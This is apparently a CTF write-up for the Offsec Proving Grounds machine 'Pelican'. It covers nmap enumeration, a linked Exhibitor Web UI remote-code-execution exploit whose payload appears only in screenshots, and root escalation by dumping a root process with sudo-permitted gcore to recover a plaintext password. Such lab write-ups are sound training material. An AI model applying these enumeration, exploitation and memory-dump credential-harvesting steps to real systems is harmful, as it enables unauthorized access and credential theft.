---
title: Writeup - Offsec PG Pelican
date: 2023-10-02  
author: kei5uke
description: Writeup for PG Pelican 
tags:
  - linux
  - writeup
---

# Pelican

# **Enumeration with Nmap**

```bash
┌──(root💀kali)-[~/perican]
└─# nmap -p- -sC -sV 192.168.246.98 -T4 -oN nmap.out
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-02 01:05 EEST
Warning: 192.168.246.98 giving up on port because retransmission cap hit (6).
Stats: 0:09:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 88.89% done; ETC: 01:15 (0:00:02 remaining)
Nmap scan report for 192.168.246.98
Host is up (0.047s latency).
Not shown: 65495 closed tcp ports (reset), 31 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  Eetbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|_  Potentially risky methods: PUT
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.246.98:8080/exhibitor/v1/ui/index.html
41665/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-10-01T22:15:28
|_  start_date: N/A
|_clock-skew: mean: 1h20m01s, deviation: 2h18m35s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2023-10-01T18:15:31-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 600.31 seconds
```

# Enumerate SMB

```bash
┌──(root💀kali)-[~]
└─# smbclient \\\\192.168.246.98\\IPC$                                                                                   1 ⨯
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
```

No interesting findings in SMB.


# Enumerate HTTP (8080)

![Screenshot 2023-10-02 at 01.26.03.png](Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_01.26.03.png)

# Exploit the Service

I searched for an exploit for Exhibitor for Zookeeper and found an interesting note.

[Exhibitor Web UI 1.7.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48654)

![Screenshot 2023-10-02 at 02.19.01.png](Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_02.19.01.png)

I added the necessary part in the java.env script and committed the setting.

![Screenshot 2023-10-02 at 02.19.21.png](Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_02.19.21.png)

# Low Privilege Shell

![Screenshot 2023-10-02 at 02.34.36.png](Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_02.34.36.png)

I successfully got the shell.

# Privilege Escalation

```bash
charles@pelican:/opt/zookeeper$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

The command `/usr/bin/gcore` is allowed to run as root apparently.

[gcore - GTFOBins](https://gtfobins.github.io/gtfobins/gcore/)

The gcore command generates a core file (dump file) of a running process. It can be used to retrieve sensitive information if the process is run by root.  
It can be a way to retrieve sensitive information if the process is run by root.

```bash
root       527  0.0  0.0   2276    72 ?        Ss   18:02   0:00 /usr/bin/password-store
```
I found an interesting process:

```bash
sudo /usr/bin/gcore 527
```
I got the dump.

```bash
charles@pelican:~$ strings core.527
strings core.527
CORE
password-store
/usr/bin/password-store 
CORE
CORE
/usr/bin/passwor
////////////////
LINUX
...
```
I analyzed the strings.

```bash
001 Password: root:
ClogKingpinInning731
```
I found interesting text. It could be root password.

![Screenshot 2023-10-02 at 02.45.22.png](Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_02.45.22.png)

`sudo su root -p`  and paste the password and got the root shell.

# Note
After taking a break from the Linux CTF challenges, diving into this one brought back the familiar excitement of the challenge. It took some effort to track down a shell. But it turned out that the vulnerability had been hiding in plain sight on the web page all along.  
In the enumeration stage, I missed some important information because the version of the vulnerability didn't seem to match. This remined me to stay vigilant and pay attention to every detail.  
